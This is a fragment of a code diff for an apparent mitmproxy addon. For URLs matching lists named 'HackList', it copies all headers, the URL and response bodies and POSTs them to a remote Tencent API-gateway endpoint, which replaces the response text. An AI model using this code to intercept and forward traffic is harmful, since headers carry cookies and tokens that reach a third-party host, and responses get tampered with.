+              res = conn.getresponse()
+              data = res.read()
+              returnText = data.decode("utf-8")
           flow.response.set_text(returnText)
-  
+    for item in repHackList:
+      findList = pattern = re.compile(item).findall(flow.request.url)
+      if (len(findList) > 0):
+        headersTemp = {}
+        for item in flow.response.headers:
+          headersTemp[item] = flow.response.headers[item]
+        conn = http.client.HTTPSConnection("service-g9parw23-1256763111.bj.apigw.tencentcs.com")
+        # flow.request.text = 'asd'
+        conn.request("POST", "/release/redirect", json.dumps({
+          "url": flow.request.url,
+          "host": flow.request.host,
+          "headers": headersTemp,
+          "data": flow.response.text
+        }), {
+          'Content-Type': 'application/json',
+        })
+        res = conn.getresponse()
+        data = res.read()
   def request(self, flow):
     if (flow.request.url):
       for item in reqHackList:
         findList = pattern = re.compile(item).findall(flow.request.url)
         if (len(findList) > 0):
-          print(flow.request.headers)
+          # print(flow.request.headers)
           # flow.request.headers['owoHost'] = flow.request.host
           # flow.request.headers['owoPath'] = flow.request.path
           # flow.request.path = "/redirect"
@@ -662,8 +587,9 @@ class ModifyResponse:
           headersTemp = {}
           for item in flow.request.headers:
             headersTemp[item] = flow.request.headers[item]
-          conn = http.client.HTTPSConnection("hanshu.run")
-          conn.request("POST", "/redirect", json.dumps({
+          conn = http.client.HTTPSConnection("service-g9parw23-1256763111.bj.apigw.tencentcs.com")
+          # flow.request.text = 'asd'
+          conn.request("POST", "/release/redirect", json.dumps({
             "url": flow.request.url,
             "path": flow.request.path,
             "host": flow.request.host,
@@ -676,7 +602,7 @@ class ModifyResponse:
           })
           res = conn.getresponse()
           data = res.read()
-          print(data.decode("utf-8"))
+          # print(data.decode("utf-8"))
         
 addons = [
   ModifyResponse()
